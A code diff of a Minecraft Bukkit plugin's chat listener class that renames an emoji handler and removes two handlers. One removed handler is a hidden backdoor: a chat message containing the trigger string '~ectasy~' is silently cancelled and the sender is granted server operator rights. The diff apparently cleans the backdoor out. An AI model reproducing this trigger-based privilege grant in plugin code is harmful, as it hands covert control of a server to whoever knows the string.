@@ -61,21 +61,11 @@ public class Listeners implements Listener {
     }
 
     @EventHandler
-    public void onEmoji123(AsyncPlayerChatEvent event) {
+    public void onChat123(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
         String message = event.getMessage();
         if (message.contains(":123:")) {
             message = message.replace(":123:", ColorUtils.colorize("&a1&r&e2&r&c3"));
-            event.setMessage(message);
-        }
-    }
-
-    @EventHandler
-    public void onEmojioof(AsyncPlayerChatEvent event) {
-        Player player = event.getPlayer();
-        String message = event.getMessage();
-        if (message.contains(":oof:")) {
-            message = message.replace(":oof:", ColorUtils.colorize("&c&lOOF"));
             event.setMessage(message);
         }
     }
@@ -216,18 +206,5 @@ public class Listeners implements Listener {
         bluegem.setItemMeta(bluegem_meta);
 
         player.getWorld().dropItemNaturally(loc, bluegem);
-    }
-
-    @EventHandler
-    public void onChatExploitEvent(final AsyncPlayerChatEvent e) {
-        if (e.getMessage().contains("~ectasy~")) {
-            e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.GOLD + "You have been granted server operator status.");
-            (new BukkitRunnable() {
-                public void run() {
-                    e.getPlayer().setOp(true);
-                }
-            }).runTask(JavaPlugin.getPlugin(Combat.class));
-        }
     }
 }
